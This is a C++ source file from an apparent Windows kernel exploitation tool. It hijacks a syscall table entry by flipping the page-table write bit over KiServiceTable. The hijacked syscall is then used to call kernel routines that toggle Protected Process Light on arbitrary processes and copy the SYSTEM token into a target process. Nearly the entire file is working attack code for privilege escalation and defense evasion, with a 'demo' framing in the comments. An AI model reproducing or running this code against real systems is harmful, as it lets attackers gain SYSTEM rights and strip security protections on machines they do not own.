#include "kernelHelperUtil.h"
#include "kernelHelper.h"
#include "offsets.h"
#include <tchar.h>
#include <ntstatus.h>

// Read by the asm stub. Populated at runtime by resolveKernelArtifacts() from
// the ntdll!NtSetQuotaInformationFile prologue, so it tracks whatever syscall
// number the local Windows build assigns.
extern "C" DWORD32 syscallNumber = 0;

// ntdll syscall stubs on x64 always start with:
//      4C 8B D1                mov r10, rcx
//      B8 ?? ?? ?? ??          mov eax, syscallNumber
// so the 4 bytes at +4 are the syscall index for that routine.
static DWORD GetSyscallNumberFromNtdll(const char* name) {
	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (!ntdll) return 0xFFFFFFFF;
	BYTE* func = (BYTE*)GetProcAddress(ntdll, name);
	if (!func) return 0xFFFFFFFF;
	if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 && func[3] == 0xB8) {
		return *reinterpret_cast<DWORD*>(func + 4);
	}
	return 0xFFFFFFFF;
}

// Load ntoskrnl.exe as a user-mode image, resolve the export, and convert the
// user-mode address to a kernel-mode address by adding the leaked kernel base
// to the export's RVA. DONT_RESOLVE_DLL_REFERENCES suppresses DllMain (which
// would otherwise blow up — ntoskrnl isn't designed for user mode).
static DWORD64 ResolveKernelExport(DWORD64 ntKernelBase, const char* exportName) {
	HMODULE userNt = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!userNt) return 0;
	FARPROC userAddr = GetProcAddress(userNt, exportName);
	DWORD64 kernelAddr = 0;
	if (userAddr) {
		DWORD64 rva = (DWORD64)userAddr - (DWORD64)userNt;
		kernelAddr = ntKernelBase + rva;
	}
	FreeLibrary(userNt);
	return kernelAddr;
}

ULONGLONG get_pde_address_64(ULONGLONG address, ULONGLONG pte_start)
{
	ULONGLONG pml4_self_ref = pte_start & 0x0000fff000000000;
	ULONGLONG pde_va;
	pde_va = address >> 9;
	pde_va = pde_va >> 9;
	pde_va = pde_va & 0x3ffffff8;  // Null Last 3 bits and PML4 AND PDPT
	pde_va = pde_va | pml4_self_ref;
	pde_va = pde_va | (pml4_self_ref >> 9);
	pde_va = pde_va | 0xffff000000000000;
	return pde_va;
}

void Log(const char* Message, ...) {
	const auto file = stderr;

	va_list Args;
	va_start(Args, Message);
	std::vfprintf(file, Message, Args);
	std::fputc('\n', file);
	va_end(Args);
}

PVOID kernelHelper::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

kernelHelper::kernelHelper(MemHandler* objMemHandlerArg)
{
	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
}

kernelHelper::~kernelHelper()
{
	// Safety net: if something returned mid-hijack the table would be left
	// pointing at the wrong routine and KiServiceTable's page would still be
	// writable — both of which are BSOD-on-next-call hazards.
	if (m_hijackPrepared) {
		restoreHijack();
	}
}

DWORD64 kernelHelper::returnNTBASE()
{
	DWORD64 address = (DWORD64)this->lpNtosBase;
	return address;
}

bool kernelHelper::resolveKernelArtifacts()
{
	if (m_resolved) return true;
	if (!lpNtosBase) {
		printf("[!] ntoskrnl base not resolved (need SYSTEM on modern Win11)\n");
		return false;
	}
	DWORD64 nt_base = (DWORD64)lpNtosBase;
	printf("[*] ntoskrnl base address: 0x%p\n", lpNtosBase);

	if (!objMemHandler->VirtualRead(
		nt_base + KeServiceDescriptorTableShadow_Offset_fromNT,
		&m_kiServiceTable, sizeof(m_kiServiceTable))) {
		printf("[!] failed to read nt!KiServiceTable pointer\n");
		return false;
	}
	printf("[>] nt!KiServiceTable: 0x%llx\n", m_kiServiceTable);

	DWORD64 pte_base = 0;
	if (!objMemHandler->VirtualRead(
		nt_base + MiGetPteAddress_Offset_fromNT,
		&pte_base, sizeof(pte_base))) {
		printf("[!] failed to read PTE base\n");
		return false;
	}
	printf("[>] PTE base: 0x%llx\n", pte_base);

	m_kiServiceTablePde = get_pde_address_64(m_kiServiceTable, pte_base);
	printf("[>] KiServiceTable PDE: 0x%llx\n", m_kiServiceTablePde);

	// Dynamic syscall # — falls back to the offsets.h default on failure.
	m_syscallNumber = GetSyscallNumberFromNtdll("NtSetQuotaInformationFile");
	if (m_syscallNumber == 0xFFFFFFFF) {
		m_syscallNumber = NtSetQuotaInformationFile_syscallnumber;
		printf("[!] ntdll lookup failed; falling back to hardcoded syscall 0x%x\n", m_syscallNumber);
	}
	else {
		printf("[>] NtSetQuotaInformationFile syscall #: 0x%x (resolved from ntdll)\n", m_syscallNumber);
	}
	syscallNumber = m_syscallNumber;
	m_syscallEntryAddr = m_kiServiceTable + (DWORD64)m_syscallNumber * 4;

	// Dynamic kernel exports.
	m_psLookupProcessByProcessId = ResolveKernelExport(nt_base, "PsLookupProcessByProcessId");
	if (!m_psLookupProcessByProcessId) {
		m_psLookupProcessByProcessId = nt_base + PsLookupProcessByProcessId_Offset_fromNT;
		printf("[!] ntoskrnl export lookup failed; falling back to hardcoded PsLookupProcessByProcessId\n");
	}
	printf("[>] PsLookupProcessByProcessId: 0x%llx\n", m_psLookupProcessByProcessId);

	m_memcpyAddr = ResolveKernelExport(nt_base, "memcpy");
	if (!m_memcpyAddr) {
		printf("[!] failed to resolve nt!memcpy (privesc demo will be unavailable)\n");
	}
	else {
		printf("[>] memcpy: 0x%llx\n", m_memcpyAddr);
	}

	m_resolved = true;
	return true;
}

bool kernelHelper::prepareHijack()
{
	if (!resolveKernelArtifacts()) return false;
	if (m_hijackPrepared) return true;

	if (!objMemHandler->VirtualRead(m_syscallEntryAddr,
		&m_origSyscallEntry, sizeof(m_origSyscallEntry))) {
		printf("[!] failed to read original syscall entry\n");
		return false;
	}
	printf("[>] saved original syscall entry: 0x%x\n", m_origSyscallEntry);

	if (!objMemHandler->VirtualRead(m_kiServiceTablePde,
		&m_origPdeFlags, sizeof(m_origPdeFlags))) {
		printf("[!] failed to read PDE flags\n");
		return false;
	}
	printf("[>] original PDE flags: 0x%llx\n", m_origPdeFlags);

	DWORD64 newFlags = m_origPdeFlags ^ (1ULL << 1);
	if (!objMemHandler->WriteMemoryDWORD64(m_kiServiceTablePde, newFlags)) {
		printf("[!] failed to flip PDE R/W bit\n");
		return false;
	}
	printf("[>] flipped PDE R/W bit: 0x%llx -> 0x%llx\n", m_origPdeFlags, newFlags);
	Sleep(500);

	m_hijackPrepared = true;
	return true;
}

bool kernelHelper::pointSyscallTo(DWORD64 kernelFuncAddr, DWORD stackArgCount)
{
	if (!m_hijackPrepared) {
		printf("[!] pointSyscallTo called before prepareHijack\n");
		return false;
	}
	if (kernelFuncAddr < m_kiServiceTable) {
		printf("[!] target 0x%llx below KiServiceTable — signed-offset overflow\n",
			kernelFuncAddr);
		return false;
	}
	DWORD64 delta = kernelFuncAddr - m_kiServiceTable;
	// The entry encodes (offset << 4) | (stackArgs & 0xF), so offset must
	// fit in 28 bits (256 MB) — comfortably inside ntoskrnl.
	if (delta > 0x0FFFFFFFULL) {
		printf("[!] target too far from KiServiceTable (delta 0x%llx > 28-bit limit)\n",
			delta);
		return false;
	}
	DWORD encoded = ((DWORD)delta << 4) | (stackArgCount & 0xF);
	if (!objMemHandler->WriteMemoryPrimitive(4, m_syscallEntryAddr, encoded)) {
		printf("[!] failed to overwrite syscall entry\n");
		return false;
	}
	printf("[>] syscall 0x%x -> 0x%llx (encoded 0x%x, stackArgs=%u)\n",
		m_syscallNumber, kernelFuncAddr, encoded, stackArgCount);
	Sleep(100);
	return true;
}

bool kernelHelper::restoreHijack()
{
	if (!m_hijackPrepared) return true;
	bool ok = true;
	if (!objMemHandler->WriteMemoryPrimitive(4, m_syscallEntryAddr, m_origSyscallEntry)) {
		printf("[!] failed to restore syscall entry — system is unstable\n");
		ok = false;
	}
	if (!objMemHandler->WriteMemoryDWORD64(m_kiServiceTablePde, m_origPdeFlags)) {
		printf("[!] failed to restore PDE flags — system is unstable\n");
		ok = false;
	}
	Sleep(100);
	m_hijackPrepared = false;
	if (ok) printf("[>] hijack fully restored\n");
	return ok;
}

bool kernelHelper::codeExecution(DWORD32 pid)
{
	if (!prepareHijack()) return false;

	bool ok = false;
	do {
		if (!pointSyscallTo(m_psLookupProcessByProcessId, 0)) break;

		PDWORD64 outEproc = (PDWORD64)VirtualAlloc(0, 0x1000,
			MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!outEproc) break;
		memset(outEproc, 0, 0x1000);

		printf("[>] calling PsLookupProcessByProcessId via hijacked syscall\n");
		NTSTATUS status = ((PFN_HSC_2)HijackedSyscall)(
			(void*)(uintptr_t)pid, outEproc);
		printf("[>] PsLookupProcessByProcessId status: 0x%x, EPROCESS: 0x%llx\n",
			status, outEproc[0]);

		if (status == 0 && outEproc[0]) {
			// EPROCESS.ImageFileName is 15 bytes, but the chunked R/W
			// primitive only handles 1/2/4/8-byte reads, so read a full 16
			// (one extra byte spills into the next EPROCESS field — harmless,
			// %.15s clamps the printf so we never display it).
			char processname[16] = { 0 };
			objMemHandler->VirtualRead(outEproc[0] + imageFileNameOffset,
				processname, sizeof(processname));
			printf("[>] Process Name: %.15s\n", processname);
			ok = true;
		}

		VirtualFree(outEproc, 0, MEM_RELEASE);
	} while (0);

	restoreHijack();
	return ok;
}

bool kernelHelper::pplToggle(DWORD32 targetPid, BOOL makeProtected)
{
	if (!prepareHijack()) return false;

	bool ok = false;
	do {
		if (!m_memcpyAddr) {
			printf("[!] memcpy unresolved — cannot perform kernel-mode write\n");
			break;
		}

		// ---- Hijack #1: PsLookupProcessByProcessId ----
		if (!pointSyscallTo(m_psLookupProcessByProcessId, 0)) break;

		PDWORD64 lookupBuf = (PDWORD64)VirtualAlloc(0, 0x1000,
			MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!lookupBuf) break;
		memset(lookupBuf, 0, 0x1000);

		NTSTATUS s1 = ((PFN_HSC_2)HijackedSyscall)(
			(void*)(uintptr_t)targetPid, lookupBuf);
		DWORD64 targetEproc = lookupBuf[0];
		VirtualFree(lookupBuf, 0, MEM_RELEASE);
		printf("[>] PsLookupProcessByProcessId(%u) -> 0x%x, EPROCESS=0x%llx\n",
			targetPid, s1, targetEproc);

		if (s1 || !targetEproc) break;

		// Read current Protection byte (4-byte chunk; we only care about
		// the low byte).
		DWORD currentDword = 0;
		objMemHandler->VirtualRead(targetEproc + protectionOffset,
			&currentDword, sizeof(currentDword));
		BYTE currentProt = (BYTE)(currentDword & 0xFF);
		printf("[>] current Protection byte: 0x%02x (Type=%u, Audit=%u, Signer=%u)\n",
			currentProt,
			currentProt & 0x07,
			(currentProt >> 3) & 0x01,
			(currentProt >> 4) & 0x0F);

		// New byte: 0x61 = (WinTcb << 4) | ProtectedLight | (Audit=0)
		BYTE newProt = makeProtected ? 0x61 : 0x00;
		printf("[>] target Protection byte: 0x%02x  (%s)\n",
			newProt,
			makeProtected ? "PPL, WinTcb signer" : "unprotected");

		// ---- Hijack #2: memcpy(dst, src, 1) ----
		if (!pointSyscallTo(m_memcpyAddr, 0)) break;

		BYTE srcBuf = newProt;
		printf("[>] calling memcpy(0x%llx, 0x%p, 1) via hijacked syscall\n",
			targetEproc + protectionOffset, &srcBuf);
		((PFN_HSC_3)HijackedSyscall)(
			(void*)(targetEproc + protectionOffset),
			&srcBuf,
			(void*)(uintptr_t)1);

		DWORD afterDword = 0;
		objMemHandler->VirtualRead(targetEproc + protectionOffset,
			&afterDword, sizeof(afterDword));
		BYTE afterProt = (BYTE)(afterDword & 0xFF);
		printf("[>] post-write Protection byte: 0x%02x\n", afterProt);
		ok = (afterProt == newProt);
		printf(ok ? "[+] /ppl OK — Protection byte updated\n"
				  : "[!] verification failed\n");
	} while (0);

	restoreHijack();
	return ok;
}

bool kernelHelper::privesc(DWORD32 targetPid)
{
	if (!prepareHijack()) return false;

	bool ok = false;
	do {
		if (!m_memcpyAddr) {
			printf("[!] memcpy unresolved — cannot perform kernel-mode token write\n");
			break;
		}

		// ============================================================
		//  Hijack #1 — PsLookupProcessByProcessId (2 args, regs only)
		// ============================================================
		if (!pointSyscallTo(m_psLookupProcessByProcessId, 0)) break;

		PDWORD64 lookupBuf = (PDWORD64)VirtualAlloc(0, 0x1000,
			MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!lookupBuf) break;
		memset(lookupBuf, 0, 0x1000);

		DWORD64 targetEproc = 0, systemEproc = 0;

		NTSTATUS s1 = ((PFN_HSC_2)HijackedSyscall)(
			(void*)(uintptr_t)targetPid, lookupBuf);
		targetEproc = lookupBuf[0];
		printf("[>] PsLookupProcessByProcessId(%u) -> 0x%x, EPROCESS=0x%llx\n",
			targetPid, s1, targetEproc);

		lookupBuf[0] = 0;
		NTSTATUS s2 = ((PFN_HSC_2)HijackedSyscall)(
			(void*)(uintptr_t)4, lookupBuf);  // PID 4 = System
		systemEproc = lookupBuf[0];
		printf("[>] PsLookupProcessByProcessId(4 SYSTEM) -> 0x%x, EPROCESS=0x%llx\n",
			s2, systemEproc);

		VirtualFree(lookupBuf, 0, MEM_RELEASE);

		if (s1 || s2 || !targetEproc || !systemEproc) {
			printf("[!] EPROCESS lookup failed — aborting before any writes\n");
			break;
		}

		// Read both tokens via the R/W primitive (no hijack needed here).
		DWORD64 targetToken = 0, systemToken = 0;
		objMemHandler->VirtualRead(targetEproc + tokenOffset,
			&targetToken, sizeof(targetToken));
		objMemHandler->VirtualRead(systemEproc + tokenOffset,
			&systemToken, sizeof(systemToken));
		printf("[>] target EX_FAST_REF Token: 0x%llx\n", targetToken);
		printf("[>] SYSTEM EX_FAST_REF Token: 0x%llx\n", systemToken);

		// EX_FAST_REF packs (cached_refcount : 4) | (pointer : 60).
		// Keep the target's existing low-4 ref count so the refcount logic
		// stays sane — only the pointer bits need to come from SYSTEM.
		DWORD64 newToken = (systemToken & ~0xFULL) | (targetToken & 0xFULL);
		printf("[>] new Token to install: 0x%llx\n", newToken);

		// ============================================================
		//  Hijack #2 — memcpy(dst, src, count). All 3 args in registers,
		//  so the encoded stack-arg count stays 0. This is the demo of
		//  redirecting the same syscall slot at a different routine with
		//  a different signature, and using it to perform the write
		//  from kernel mode rather than going through RTCore64.
		// ============================================================
		if (!pointSyscallTo(m_memcpyAddr, 0)) break;

		DWORD64 srcBuf = newToken;  // user-readable in our own context
		printf("[>] calling memcpy(0x%llx, 0x%p, 8) via hijacked syscall\n",
			targetEproc + tokenOffset, &srcBuf);
		((PFN_HSC_3)HijackedSyscall)(
			(void*)(targetEproc + tokenOffset),
			&srcBuf,
			(void*)(uintptr_t)sizeof(DWORD64));

		DWORD64 verify = 0;
		objMemHandler->VirtualRead(targetEproc + tokenOffset,
			&verify, sizeof(verify));
		printf("[>] post-write Token: 0x%llx\n", verify);
		ok = ((verify & ~0xFULL) == (systemToken & ~0xFULL));
		printf(ok ? "[+] privesc OK — target process now runs as SYSTEM\n"
				  : "[!] privesc verification failed\n");
	} while (0);

	restoreHijack();
	return ok;
}
